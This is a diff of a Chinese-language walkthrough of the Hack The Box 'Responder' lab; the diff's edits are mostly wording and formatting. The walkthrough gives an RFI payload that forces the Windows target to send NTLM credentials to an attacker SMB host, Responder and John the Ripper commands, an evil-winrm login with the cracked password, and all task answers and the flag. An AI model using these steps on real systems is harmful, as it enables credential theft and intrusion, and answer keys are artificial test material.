@@ -3,7 +3,7 @@ title: "Hack The Box: Starting Point - Responder"
 published: 2025-05-28 14:34:45
 updated: 2025-05-28 14:34:45
 description: ""
-image: ""
+image: "cover.png"
 tags:
     - RFI
     - NTLM
@@ -19,7 +19,7 @@ pinned: false
 
 - 利用 RFI 漏洞向 Kali 發送 SMB 的存取請求
 - Responder 攔截 NTLM 雜湊
-- John The Ripper 線下爆破密碼
+- John The Ripper 離線爆破密碼
 - evil-winrm 遠端存取主機並取得 flag
 
 ## Reconnaissance
@@ -49,7 +49,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Wed May 28 03:01:57 2025 -- 1 IP address (1 host up) scanned in 199.57 seconds
 ```
 
-從掃描的結果來看，我們得知目標主機是 Windows，有開網頁服務（port 80）。Port 5985 是 Windows Remote Management (WinRM) 服務的默認通訊埠，它使用 HTTP 協議進行通訊，這對後續可能的遠程訪問非常重要。而 port 7680 經過搜尋得知，是 Windows 用來傳遞最佳化的（Delivery Optimization）通訊 port。
+從掃描的結果來看，我們得知目標主機是 Windows，有開網頁服務（port 80）。Port 5985 是 Windows Remote Management (WinRM) 服務的默認通訊埠，它使用 HTTP 協定進行通訊，這對後續可能的遠程訪問非常重要。而 port 7680 經過搜尋得知，是 Windows 用來傳遞最佳化的（Delivery Optimization）通訊 port。
 
 嘗試打開瀏覽器瀏覽網頁，會發現網址列被重新導向到 <http://unika.htb/> ，而且網頁沒辦法正常顯示。這是因為我們的系統無法解析 unika.htb 這個域名。這種情況下，我們可以透過修改主機的 `/etc/hosts` 檔案來偽造 DNS 解析。
 
@@ -59,11 +59,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ![成功存取網頁](access_web_page.png)
 
->  **Task 1**
-> 
-> When visiting the web service using the IP address, what is the domain that we are being redirected to? 
+> **Task 1**
+>
+> When visiting the web service using the IP address, what is the domain that we are being redirected to?
 
-Ans: unika.htb
+Ans: `unika.htb`
 
 ## Fuzzing
 
@@ -74,10 +74,10 @@ Ans: unika.htb
 從網址列可以看到，網站使用 `page` 參數來載入不同的頁面內容，例如 `?page=french.html`。如果網站沒有妥善過濾這個參數，攻擊者可能能夠存取系統上的其他檔案。
 
 > **Task 2**
-> 
-> Which scripting language is being used on the server to generate webpages? 
+>
+> Which scripting language is being used on the server to generate webpages?
 
-Ans: php
+Ans: `php`
 
 此時，Task 4 很貼心地告訴我們可以試試那些路徑。
 
@@ -99,29 +99,29 @@ Task 5 則是問 RFI 的可能，如果能製造 SMB 存取 `//<ip>/<file>`，�
 
 Ans: `//10.10.14.6/somefile`
 
-RFI（Remote File Include）與 LFI 類似，但它允許攻擊者從外部服務器加載文件，而不僅僅是本地文件。在 Windows 環境中，當系統嘗試通過 SMB 協議訪問如 `//10.10.14.6/somefile` 的路徑時，Windows 會自動發送認證信息到指定的 IP 地址。這是我們接下來要利用的關鍵。
+RFI（Remote File Include）與 LFI 類似，但它允許攻擊者從外部服務器載入檔案，而不僅僅是本地檔案。在 Windows 環境中，當系統嘗試通過 SMB 協定訪問如 `//10.10.14.6/somefile` 的路徑時，Windows 會自動發送認證資訊到指定的 IP 地址。這是我們接下來要利用的關鍵。
 
 ## Exploit
 
+Task 6 和 Task 7 給了我一點漏洞利用的方向。
+
 > **Task 6**
 >
-> What does NTLM stand for? 
+> What does NTLM stand for?
 
-Ans: New Technology LAN Manager
+Ans: `New Technology LAN Manager`
 
 Task 7 是在問 [Responder](https://github.com/SpiderLabs/Responder) 的使用方式，在 GitHub README 底下的 Usage 有介紹。
 
 > **Task 7**
-> 
-> Which flag do we use in the Responder utility to specify the network interface? 
+>
+> Which flag do we use in the Responder utility to specify the network interface?
 
 Ans: `-I`
 
 此時可以猜測題目應該是希望我們用 Responder 做些什麼。
 
-::: note[ChatGPT]
-Responder 是一個用於內網的 LLMNR/NBT-NS/MDNS 偽造與憑證攔截工具，由 SpiderLabs 開發。它可以攔截來自受害者主機對內部資源名稱解析失敗時所發出的廣播封包，進而誘騙其將認證資料發送給攻擊者。
-:::
+> Responder 是一個用於內網的 LLMNR/NBT-NS/MDNS 偽造與憑證攔截工具，由 SpiderLabs 開發。它可以攔截來自受害者主機對內部資源名稱解析失敗時所發出的廣播封包，進而誘騙其將認證資料發送給攻擊者。
 
 我們先啟動 responder 接收傳送過來的 challenge，接著透過 `ip a` 找到對應網路介面的 ip，用 LFI 那向 Kali 請求 SMB，就可以拿到 NTLM hash。
 
@@ -165,35 +165,35 @@ ip a
 
 ## Password Cracking
 
-收到 NTLM hash 後，就可以嘗試使用 John The Ripper 線下爆破。
+收到 NTLM hash 後，就可以嘗試使用 John The Ripper 離線破解密碼。
 
 > **Task 8**
 >
-> There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?. 
+> There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
 
-Ans: John The Ripper
+Ans: `John The Ripper`
 
-首先，我們將剛才獲取的 NTLMv2 Hash 保存到 `hashes.txt` 文件中，然後使用 John The Ripper 工具和常見密碼字典（rockyou.txt）進行爆破：
+首先，我們將剛才獲取的 NTLMv2 Hash 保存到 `hashes.txt` 文件中，然後使用 John The Ripper 工具和常見密碼字典（`rockyou.txt`）進行爆破：
 
 ```shell
 john --format=netntlmv2 hashes.txt -w /usr/wordlists/rockyou.txt
 ```
 
-John The Ripper 會嘗試字典中的每個密碼，直到找到一個匹配的。在這個案例中，成功破解出管理員密碼為 "badminton"。
+John The Ripper 會嘗試字典中的每個密碼，直到找到一個匹配的。在這個案例中，成功破解出管理員密碼為 `badminton`。
 
 > **Task 9**
-> 
-> What is the password for the administrator user? 
+>
+> What is the password for the administrator user?
 
-Ans: badminton
+Ans: `badminton`
 
 ## Access Target
 
 > **Task 10**
 >
-> We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? 
+> We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
 
-Ans: 5985 
+Ans: `5985`
 
 拿到密碼後，我們可以嘗試登入 WinRM。
 
@@ -210,14 +210,12 @@ Ans: 5985
 sudo evil-winrm -i 10.129.241.9 -u Administrator -p badminton
 ```
 
-連接成功後，我們就可以在目標系統上執行命令並瀏覽文件系統。使用 `ls` 命令查看當前目錄，然後切換到 Administrator 的桌面來尋找 flag 文件。
-
-登入對方主機後，可以看到除了管理員還有其他使用者，然後就在他桌上找到 flag 了。
+登入對方主機後，我們就可以在目標系統上執行命令並瀏覽檔案系統，可以看到除了管理員還有其他使用者，然後就在 mike 桌上找到 flag 了。
 
 ![登入 WinRM 獲取 flag](win_rm.png)
 
 > **Submit Flag**
 >
-> Submit root flag 
+> Submit root flag
 
 Ans: `ea81b7afddd03efaa0945333ed147fac`
